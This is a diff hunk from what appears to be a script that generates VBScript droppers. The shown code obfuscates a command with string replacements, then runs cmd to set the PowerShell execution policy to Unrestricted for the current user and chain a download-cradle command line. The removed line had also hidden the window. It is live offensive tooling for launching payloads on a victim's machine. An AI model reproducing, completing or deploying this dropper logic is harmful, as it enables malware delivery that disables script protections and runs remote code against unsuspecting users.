@@ -474,8 +474,8 @@ Sub Main
    Layback=rEpLaCe($Apii, `"@!`", `"`")
    Cmd=rEpLaCe(Layback, `":007:`", `"`")
 
-   Restricted=`"UnRestricted`":visible=`"false`"
-   SSLProvider.run `"cmd /R echo Y|Powershell Set-ExecutionPolicy `"+Restricted+`" -Scope CurrentUser && $CrandleCmdLine`", visible
+   Restricted=`"UnRestricted`"
+   SSLProvider.run(`"cmd /R echo Y|Powershell Set-ExecutionPolicy `"+Restricted+`" -Scope CurrentUser && $CrandleCmdLine`")
 end sub
 End Module")
 
